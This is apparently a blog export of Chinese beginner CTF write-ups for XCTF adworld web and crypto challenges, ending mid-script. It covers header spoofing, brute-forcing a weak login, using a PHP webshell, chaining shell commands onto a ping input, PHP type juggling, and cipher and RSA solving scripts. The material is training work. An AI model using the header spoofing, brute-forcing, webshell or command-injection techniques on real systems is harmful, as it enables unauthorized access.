[55,56,54,79,115,69,114,116,107,49,50]&gt;&gt;&gt; s = ""&gt;&gt;&gt; for i in a:... b =chr(i)... s += b&gt;&gt;&gt; print(s)786OsErtk12 0x08 xff referer 题目描述：X老师告诉小宁其实xff和referer是可以伪造的 直接访问网站，提示需要特定ip访问 由题目描述猜想是改http请求，进行下一步. 百度xff可知 X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。 利用burpsuite直接伪造http header 的 X-Forwarded-For， X-Forwarded-For 请求头格式如下 1X-Forwarded-For: client, proxy1, proxy2 可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP 如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息X-Forwarded-For: IP0, IP1, IP2 PS： Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求 然后得到如下页面 百度Refer可知 HTTP_REFERER提供了引导用户代理到当前页的前一页的地址信息，常见的一些应用场景有防盗链，统计文章有多少次是来自谷歌搜索结果，多少次来自百度搜索结果等。 什么时候获取不到HTTP_REFERER值 综上所述，HTTP_REFERER存在需要两个条件： 浏览器（客户端）请求（服务器端请求的情况下，是不存在HTTP_REFERER的，但是可以伪造header，这在下一节中将提及）；存在前导页； ​ 以下是一些获取不到HTTP_REFERER值的情况： 在浏览器内直接敲URL windows桌面上的超链接图标 浏览器内书签 第三方软件（如Word，Excel等）内容中的链接 SSL认证网站跳入 &lt; http://example.com/“&gt; meta页面设置自动跳转时，在example.com将取不到REFERER URL 使用JavaScript的Location.href或者是Location.replace() 在以下情况下可以获取HTTP_REFERER值： 直接用form提交的表单(POST或GET) src请求（如js的script标签及html中img标签的src属性） 直接伪造header的Referer属性 但是没有得到结果 后面百度发现，url/xxx和url/xxx/是不一样的，url/xxx是直接访问xxx的文件，而url/xxx/是访问xxx目录，因此我们刚才得不到flag，将Referer的后面的斜杠去掉，再次请求，得到flag 0x09 weak_auth 题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。 直接点login跳转到了check.php，提示：please login as admin 用admin空密码去登陆，显示：password error 点确认，F12查看源码&lt;script&gt;alert(&#39;password error&#39;);&lt;/script&gt;&lt;!--maybe you need a dictionary--&gt;提示可能需要一个字典，肯定是爆破了 因此，我去学习了BurpSuite的Intruder功能——用于爆破的一个工具。 关于Burp Suite 的Intruder模块的四种选项的解释 https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/ 关于BurpSuite的Intruder模块的解释： https://www.cnblogs.com/yufusec/p/9179625.html 然后爆破得到密码123456，进入系统得到flag 0x0a webshell 题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将 其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服 务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，”web”的含义是显然需要服务器开放web服务，”shell”的含义是取得对服务器某 种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操 作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 首先新建一个index.php文件，把PHP代码输入到里面，电脑可能会自动识别它为病毒，并 删除，可以恢复后使用 正如题目提示：php一句话——即php一句话木马： https://my.oschina.net/programs/blog/1649544 了解之后，想用burpsuite的post请求发送也没能获取数据，于是看了wp，用中国蚁剑连了webshell，然后直接发现目录底下就有flag.txt。 做完之后，查看官方wp，我也没弄懂他wp怎么用burpsuite去post数据来获取webshell（我回显不了数据 update：post没有回显是因为我少了分号，还有就是hackbar的post没有发出去。后面成功用burpsuite发送post请求，成功执行命令。 0x0b command execution 题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 进入页面有个输入框，尝试输入127.0.0.1发现能够ping通并显示命令 于是联想到命令拼接利用&amp;或|或；让我们的命令和ping一起执行，发现flag在/home/flag.txt里 用find命令的时候，不知道为什么在他的shell里搜索的时候要带引号，即find / -name &quot;flag*&quot;才能成功执行命令回显，去掉引号即失败了。 0x0c simple php 题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 123456789101112131415&lt;?phpshow_source(__FILE__);include("config.php");$a=@$_GET['a'];$b=@$_GET['b'];if($a==0 and $a)&#123; echo $flag1;&#125;if(is_numeric($b))&#123; exit();&#125;if($b&gt;1234)&#123; echo $flag2;&#125;?&gt; 进入页面，见到如上php代码，应该是代码审计。 即让a满足$a==0 and $a且b满足is_numeric($b)==flase&amp;$b&gt;1234得到两个flag php中的弱类型比较会使’abc’ == 0为真，所以输入a=abc时，可得到flag1。（abc可换成任意字符）。 is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真，所以当输入a=abc&amp;b=1235a，可得到flag2。 发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的 形式 数字和字符混合的字符串转换为整数后只保留数字]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-crypto-wp]]></title>
    <url>%2F2019%2F11%2F10%2FXCTF-adworld-crypto-wp%2F</url>
    <content type="text"><![CDATA[Crypto&amp;WriteUpcrypto永远充满了google和常识（还有工具 攻防世界&amp;Crypto新手练习区0x01 幂数加密 题目描述：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母} 下载附件打开查看是txt，里面放一段数字 18842101220480224404014224202480122 由ctf-wiki的常识可知，这是01248加密，即以0为分割，将其中的数加起来对应字母表的排位。 解得flag 12301248：23 5 12 12 4 15 14 5w e l l d o n e 0x02 base64 题目描述：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。 打开附件是一段英文，有题目得知是base64编码，解码得flag 12Y3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9cyberpeace&#123;Welcome_to_new_World!&#125; 0x03 Caesar 题目描述：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了 由题目得知是凯撒密码，随便百度一个工具进行暴力破解得知，移位12位 快捷：算出o和c得插值，但是我觉得更慢 12oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;cyberpeace&#123;you_have_learned_caesar_encryption&#125; 0x04 Morse 题目描述：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写) 下载附件，打开文档是一串01串 111 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110 假如按1:=.&amp;0:=-翻译则第一个字母可翻译，但是后面有一个字符无法翻译 因此，01调换顺序1:=-&amp;0:=. 利用python的str.replace的到.-的morsecode，找个在线工具直接翻译得到结果，需要自己加上cyberpeace{}格式：cyberpeace{morsecodeissointeresting} 1morsecodeissointeresting 可惜我后来没注意到需要全部小写，浪费了时间。 0x05 Railfence 题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。 打开附件是一个文档如下，如题目明显的是栅栏加密。找了个在线工具破解。 1ccehgyaefnpeoobe&#123;lcirg&#125;epriec_ora_g 结果常规栅栏加密没跑出来，在看到题目有一个数字5盲猜这可能是栅栏加密的key，但是常规的是跑不出来flag的，后面看百科知道有个是www型栅栏加密 PS:WWW型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。 由题目可知key可能是5，一尝试果然正确，得到flag：cyberpeace{railfence_cipher_gogogo} 附一个www型栅栏密码的网站： http://www.atoolbox.net/Tool.php?Id=777 附赠一个栅栏密码的脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python3#常见的栅栏解密e = input('清输入要解密的字符串\n')elen = len(e) # 计算字符串长度field = []for i in range(2, elen): # 做一个循环，从2开始到数字elen（字符串长度） if elen % i == 0: # 计算那些数字能整除字符串长度 field.append(i) # 将能整出的数字加入到field里面for f in field: b = elen // f # 用字符串实际长度除以上面计算出能整出的数字f result = &#123;x: '' for x in range(b)&#125; for i in range(elen): # 字符串有多少位，就循环多少次 a = i % b result.update(&#123;a: result[a] + e[i]&#125;) # 字符串截断，并更新数据 d = '' for i in range(b): d += result[i] print('分为'+str(f)+'栏时，解密结果为：'+d+'\n') # 输出结果，并开始下一个循环 #W型加密string=input("输入要加密的字符串\n")length = len(string)#猜想不会是一栏,和n栏（滑稽）因为这个就是原来字符串（狗头）#那么，就暴力遍历一波其中的那些⑧for i in range(2,length): result=&#123;x:""for x in range(i)&#125; for a in range(length) : width=i*2-2 num=a%width if(num&lt;i): result.update(&#123;num:result[num]+string[a]&#125;) else: ll=2*i-2-num result.update(&#123;ll:result[ll]+string[a]&#125;) d='' for k in range(i): d=d+result[k] print("分为"+str(i)+"栏,结果是："+d) 0x06 转轮机加密 题目描述：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊 看题目可知是转轮机算法 附件内容如下： 123456789101112131415161: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;密钥为： 2,3,7,5,13,12,9,1,8,10,4,11,6密文为：NFQKSEVOQOFNP //TODO：还需要搞清楚转轮机算法的原理，有点混乱现在 官方wp给出以下python自动化脚本 12345678910111213141516import resss='''1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;'''m="NFQKSEVOQOFNP"content=re.findall(r'&lt; (.*?) &lt;',sss,re.S)iv=[2,3,7,5,13,12,9,1,8,10,4,11,6]vvv=[]ans=""for i in range(13): index=content[iv[i]-1].index(m[i]) vvv.append(index)for i in range(0,26): flag="" for j in range(13): flag+=content[iv[j]-1][(vvv[j]+i)%26] print(flag) 0x07 easy RSA打开附件查看。 123456789在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出dfi=(p-1)(q-1)--------------------------------------------------------------e*d=1 mod fid=e^(fi(fi)-1) 感谢舍友的cpp文件 12345678910111213141516171819202122232425#include&lt;iostream&gt;#include&lt;cstdio&gt;#define ll long longll gcd(ll a,ll b,ll&amp;aa,ll&amp;bb)&#123; ll ab=0,ba=0;aa=1;bb=1; while(1)&#123; if(a==0)&#123;aa=ba;return b;&#125; ba-=(b/a)*aa;bb-=(b/a)*ab;b%=a; if(b==0)&#123;bb=ab;return a;&#125; aa-=(a/b)*ba;ab-=(a/b)*bb;a%=b; &#125;&#125;ll mod_inverse(ll a,ll mod)&#123; ll res,temp; ll d=gcd(a,mod,res,temp); if(d==1)return res; return -1;&#125;int main()&#123; ll p,q,e,d; p = 473398607161; q = 4511491; e = 17; std::cout&lt;&lt;mod_inverse(e,(p-1)*(q-1))&lt;&lt;std::endl;&#125; 根据舍友给的rsa的cpp文件改出的python脚本，不会爆longlong哦（虽然原题也不会爆。 1234567891011121314151617181920212223242526272829303132333435def EX_GCD(a,b,arr): #扩展欧几里得 if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g def ModReverse(a,n): #ax=1(mod n) 求a模n的乘法逆x arr = [0,1,] gcd = EX_GCD(a,n,arr) if gcd == 1: return (arr[0] % n + n) % n else: return -1'''while True: a,b = eval(input()) print(ModReverse(a,b))'''if __name__=='__main__': while True: l = input("p,q,e:") p,q,e = map(lambda x:int(x),l.split(",")) fn = (p-1)*(q-1) #print(l) d = ModReverse(e,fn) print("d=%d"%d) PS：看官方wp给出了一个GitHub项目地址：一款可以解rsa的工具 https://github.com/3summer/CTF-RSA-tool 1python solve.py --verbose --private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491 0x08 Normal_RSA 题目描述：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光 果然，解rsa都是需要工具的，看完官方wp后，发现只需要ctf-rsa-tools一行代码就能跑出flag来。 甚至连题目给的样例都是人家example里的（虽然是摘自PCTF。 1python solve.py --verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem --decrypt examples/jarvis_oj_mediumRSA/flag.enc 不过在看wp时，发现有人给了另一种常规解法 他的解题思路解题思路是：①使用 openssl 解密.pem 中参数 –&gt; ②参数十六进制转换为十进制 –&gt; ③ 利用 factor 对大整数进行分解，得到 p 和 q –&gt; ④用 rsatool 生成私钥文件: private.pem –&gt; ⑤用 private.pem 解密 flag.enc 其中第三步factor用到的网站为：http://www.factordb.com/ 1234567891011121314#1$openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem#2将得到的modulus用python进行转换$python&gt;&gt;&gt; 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 87924348264132406875276140514499937145050893665602592992418171647042491658461&gt;&gt;&gt;#3 进入网站 http://www.factordb.com/ 将大整数分解为p，q#p= 275127860351348928173285174381581152299 #q= 319576316814478949870590164193048041239#4 利用rsatool 生成私钥文件 private.pem$python rsatool.py -o private.pem -e 65537 -p XXX -q XXX#5$openssl rsautl -decrypt -in flag.enc -inkey private.pem 0x09 不仅仅是Morse 题目描述：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案} 题目附件给了一大串摩斯电码，按常理找一个网站解密了 1--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.- 摩斯电码解密网站： http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx 解出来如下，明显嵌套了另外一种加密 1MAY..--.-BE..--.-HAVE..--.-ANOTHER..--.-DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA 因为后面一串AB串，转摩斯翻译不出来，因为不晓得哪里分界，转为二进制也没有思路，百度得知这是培根密码 培根密码解密网站： http://rumkin.com/tools/cipher/baconian.php AB串解得ATTACKANDDEFENCEWORLDISINTERESTING 记得小写。 0x0a 混合编码 题目描述：经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案} 这题感觉没什么好说的，下载附件发现 1JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow== 明显的base64编码，解base64得到如下： 1&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119; 明显的unicode编码，解码得到如下 1LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw 没有明显特征，解一波base64得到如下 1/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100 盲猜Ascii吗 1234567&gt;&gt;&gt; a = '/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100'&gt;&gt;&gt; l = a.split('/')&gt;&gt;&gt; s = ''&gt;&gt;&gt; for i in range(30):#从i+1开始因为/的原因，l[0] = ''... s += chr(int(l[i+1]))&gt;&gt;&gt; s'welcometoattackanddefenceworld' 得到flag：cyberpeace{welcometoattackanddefenceworld} 0x0b easychallenge 题目描述：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在 了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。 下载附件发现是一个pyc文件，明显是一个已经编译的python文件 百度搜反编译pyc，找到一个在线反编译网站 https://tool.lu/pyc/ 反编译得到源代码： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# encoding: utf-8# 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pycimport base64def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return sdef encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return sdef encode3(ans): return base64.b32encode(ans)flag = ' 'print 'Please Input your flag:'flag = raw_input()final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='if encode3(encode2(encode1(flag))) == final: print 'correct'else: print 'wrong' 易知chr和ord为反函数、x^a^a=x、base64.b32decode()和base64.b32encode()互为反函数 因此写一个python脚本即可得出flag 1234567891011121314151617181920&gt;&gt;&gt; final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='&gt;&gt;&gt; import base64&gt;&gt;&gt; a = base64.b32decode(final)#decode3&gt;&gt;&gt; ab'\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2'#注意要将a的字节流转换&gt;&gt;&gt; b = "\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2"&gt;&gt;&gt; s = ''#decode2&gt;&gt;&gt; for i in b:... s += chr((ord(i)^36)-36)...&gt;&gt;&gt;&gt;&gt;&gt; s'`v_ZomZ^`ZxfciZoZpifc\\eeeeer'&gt;&gt;&gt; l = ''#decode1&gt;&gt;&gt; for i in s:... l+= chr((ord(i)-25)^36)...&gt;&gt;&gt; l'cyberpeace&#123;interestinghhhhh&#125;' PS： 1234567891011#编译python文件为.pyc文件$python -m compileall main.py#pyc的反编译#依赖python的uncompyle$pip install uncompyle#查看帮助$uncompyle6 --help#将models.pyc反编译成models.py$uncompyle6 models.pyc &gt; models.py 利用uncompyle6反编译的pyc文件和在线编译文件相同，也挺快的 0x0c easy_ECC 题目描述：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用 懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值} 由题目可知：这是ECC加密 123456789101112131415已知椭圆曲线加密Ep(a,b)参数为p = 15424654874903a = 16546484b = 4548674875G(6478678675,5636379357093)私钥为k = 546768求公钥K(x,y) 又因为题目说工具，了解其算法后，便找到了一个python的脚本计算公钥 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164import collectionsimport randomEllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h')curve = EllipticCurve( 'secp256k1', # Field characteristic. p=int(input('p=')), # Curve coefficients. a=int(input('a=')), b=int(input('b=')), # Base point. g=(int(input('Gx=')), int(input('Gy='))), # Subgroup order. n=int(input('k=')), # Subgroup cofactor. h=1,)# Modular arithmetic ##########################################################def inverse_mod(k, p): """Returns the inverse of k modulo p. This function returns the only integer x such that (x * k) % p == 1. k must be non-zero and p must be a prime. """ if k == 0: raise 